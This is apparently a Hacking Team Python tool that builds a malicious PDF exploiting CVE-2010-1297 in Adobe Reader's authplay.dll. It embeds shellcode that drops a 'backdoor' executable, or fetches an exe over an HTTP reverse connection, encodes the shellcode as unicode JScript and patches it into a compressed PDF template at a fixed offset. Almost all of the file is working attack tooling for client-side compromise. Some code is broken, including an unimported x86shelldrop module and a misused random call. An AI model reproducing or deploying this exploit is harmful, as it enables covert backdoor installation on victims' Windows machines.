#! /usr/bin/env python

#Copyright HT srl, 2009-2010
#http://www.hackingteam.it/ for more information

#cod

import os
import sys
import math
import warnings

if "." not in sys.path: sys.path.append(".")
if "encoders" not in sys.path: sys.path.append("encoders")
if "payloads" not in sys.path: sys.path.append("payloads")

import time
import struct
import random
import zlib
import copy
import zipfile

import jscript_unicode
import x86shelldrophttp
import x86int3
import ASCIIHexWhitespace
import x86helloworld


from resources import compressedfile

NAME='Adobe Acrobat Reader 9.x "authplay.dll"'
DESCRIPTION='Adobe Reader and Acrobat "authplay.dll" Code Execution Vulnerability'

DOCUMENTATION={}
DOCUMENTATION['Vendor']='Adobe'
DOCUMENTATION['Date public']='2010-06-05'
DOCUMENTATION['References']='http://www.adobe.com/support/security/bulletins/'
DOCUMENTATION['Repeatability']=''
DOCUMENTATION['VersionsAffected']='Acrobat Reader <= 9.3.2'
DOCUMENTATION['CVE']='CVE-2010-1297'
DOCUMENTATION["CVE Url"]="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-1297"

VERSION='1.0'

PROPERTY={}
PROPERTY['TYPE']='Exploit'
PROPERTY['SITE']='Clientside'
PROPERTY['ARCH']=[['Windows']]
PROPERTY['VERSION']=['2000','XP', 'VISTA', 'SEVEN']
PROPERTY['VENDOR']='Adobe'
PROPERTY['DELIVERY']='HTTP'

NOTES="""
Tested on:
Windows XP Professional SP3 English with Adobe Acrobat Reader 9.3.x
"""

CHANGELOG="""
"""

# Global payload
payload = 0

#from pyPdf.pdf import *
#from pyPdf.generic import *
#from pyPdf.filters import *

class acrobat_authplay():

	def __init__(self, inputFile, outputFile, dbg):
		#self.setInfo(DESCRIPTION)
		self.name=NAME
		self.debugmode = dbg
		self.output = outputFile

		self.infile = inputFile
		
		return

	def createJS(self):
		result = None
		return result
		
	def RandomNonASCIIString(self, count):
		result = ""
		
		for x in range(count):
			result = result + chr(random(1,128)+128)
		
		return result

	def rand_text_alpha(self, count, badsign):
		result = ""
		
		for x in range(count):
			result = result + badsign
		
		return result

	def createShellcode(self, length):
		return None
		
	def createShellcode2(self):
		result = None
		
		if payload == 0:
			obj = x86shelldrop.x86shelldrop()
			x = obj.get(self.infile)
			#result = struct.pack('l', len(x)+4) + x
			result = x
		elif payload == 1:
			obj = x86shelldrophttp.x86shelldrophttp()
			x = obj.get(self.infile)
			result = x
		elif payload == 2:
			obj = x86helloworld.x86helloworld()
			x = obj.get()
			result = x
			
		if self.debugmode == True:
			obj = x86int3.x86int3()
			result = obj.get() + result
			
		return result

	def makePDF(self):
		input = bytearray(zlib.decompress(compressedfile))
		#input = bytearray(self.compressedfile)
		
		#secondstage = 
		shellcode = self.createShellcode2()
		
		#shellcodelen = len(shellcode)
		
		encoder = jscript_unicode.jscript_unicode()
		
		# Transform jscript in unicode jscript
		#script = self.createJS()
		#script = script.replace("SECONDSTAGE", "\"" + encoder.get(secondstage) + "\"")
		#script = script.replace("FIRSTSTAGE", encoder.get(shellcode[:shellcodelen-0x10]))
		
		shellcode = encoder.get(shellcode)
		
		offset = 0x11140
	
		for i in range(0,len(shellcode)):
			input[offset + i] = shellcode[i]

		#input = input.replace("JAVASCRIPTCODE", script)
		
		with warnings.catch_warnings():
			warnings.simplefilter('ignore')
			tmp_pdf = os.tempnam()

		# Create the output archive
		print "Creating %s pdf file "%(self.output)
		
		f = open(self.output,mode='wb')
		f.write(input)
		f.close()
		
		return 0

	def run(self):
		return self.makePDF()

if __name__=='__main__':
	dbg = False
	http = False
	
	if len(sys.argv) < 3:
		print "[ERROR] %s require 3 parameters"%(DESCRIPTION)
		print "[-INFO] backdoor output [-debug | -http]"
		sys.exit(0)

	if len(sys.argv) > 2:
		for i in range(2, len(sys.argv)):
			if sys.argv[i] == '-http':
				print "[HTTP] Using HTTP reverse connect to download exe"
				payload = 1
				http = True
			elif sys.argv[i] == '-debug':
				print "[DEBUG] Using INT3 exploit mode"
				dbg = True
			elif sys.argv[i] == '-hello':
				print "[HELLOWORLD] Using HelloWorld payload"
				payload = 2

	if http == False:
		if os.path.isfile(sys.argv[1]) == False:
			print "[ERROR] File %s doesn't exists."%(sys.argv[1])
			sys.exit(0)

		if os.path.getsize(sys.argv[1]) == 0:
			print "[ERROR] File %s has length zero."%(sys.argv[1])
			sys.exit(0)
	
	print 'Running %s Exploit v %s'%(DESCRIPTION,VERSION)
	
	app=acrobat_authplay(sys.argv[1], sys.argv[2], dbg)
	app.run()
	
	print ' ... done'